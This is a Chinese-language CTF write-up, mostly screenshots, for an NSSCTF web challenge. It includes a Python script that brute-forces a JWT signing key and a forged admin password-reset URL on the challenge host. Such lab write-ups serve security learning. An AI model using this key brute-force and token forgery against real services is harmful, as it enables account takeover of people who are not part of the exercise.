[NSSRound#20 Basic]组合拳！ | NSSCTF](https://www.nssctf.cn/problem/5249)
![image](https://github.com/user-attachments/assets/607f872d-2cb9-48a0-b120-f57287ac0202)
打开发现是登录
![image](https://github.com/user-attachments/assets/0044e5dc-4883-4bf1-8d07-7ce0f91f2f5c)
尝试admin,密码随便输，无效，没有说用户是否存在，换其他的没用
有注册用户方式，试试看
![image](https://github.com/user-attachments/assets/c071f59f-7db4-4181-b886-4aef637d7ff9)
可以注册
但是登录显示没有权限，看来要admin
查看另一个突破口，重置密码试试，拿自己的账号
> [!NOTE]
有重置链接，查资料
![image](https://github.com/user-attachments/assets/d635ad05-5f76-4dfe-9207-6b073079dc7d)
查了一下验证码的资料
![image](https://github.com/user-attachments/assets/3d109131-3218-4eb4-9eb8-509c9b4e3315)
哦，尝试扫描网站端口，找到开放的端口
使用dirsearch工具来扫描开发端口
![image](https://github.com/user-attachments/assets/ad36b26c-1bfe-4300-8db4-7a0d4e3941f3)
![image](https://github.com/user-attachments/assets/0a8ca01b-7ff3-4f88-be46-46e64f8c7468)
暴力解出来，哭不太会
```
from authlib.jose import jwt
from authlib.jose.errors import BadSignatureError
from string import ascii_letters,digits
from itertools import product
from tqdm import tqdm
​
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiOTA5NzI3NzE1QHFxLmNvbSIsImVtYWlsIjoiOTA5NzI3NzE1QHFxLmNvbSIsInR5cGUiOjN9.Fxhwn5QJl74QAMVcYzLAXdT1tgies-IAWiXGoghWXBA"
​
# 其实这里走了捷径，可以忽略特殊符号
for i in tqdm(product(list(ascii_letters+digits),repeat=4),desc='attaching...'):
    i = "".join(i)
    try:
        jwt.decode(
            token,
            key=i
        )
        exit(f'key: {i}')
    except BadSignatureError:
        continue;
```
解出
![image](https://github.com/user-attachments/assets/748958e6-a25f-4b82-bcb9-c42288caa91d)
然后反解出admin的重置密码
![image](https://github.com/user-attachments/assets/cf592b22-5e52-4b4b-acd2-6941f2cb7b59)
**推出链接来重置密码**
http://node6.anna.nssctf.cn:20562/#/reset_token?email=Administrator@163.com&token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW4iLCJlbWFpbCI6IkFkbWluaXN0cmF0b3JAMTYzLmNvbSIsInR5cGUiOjMsImV4cCI6MTczMjYyNjkxOH0.ff-9dF2mQvNTyYpSF0OxZ2dR_iKzvZOugtaIYH7nFQI
![image](https://github.com/user-attachments/assets/46620bd5-cca3-4244-bdc7-93c24b3df613)
最后进入后台，有个资源下载器，base64的反解得到printf("hello world")，好像没啥用
以下内容不太会
![image](https://github.com/user-attachments/assets/ca854366-cf86-4a9a-a4e9-837ffcd4010b)
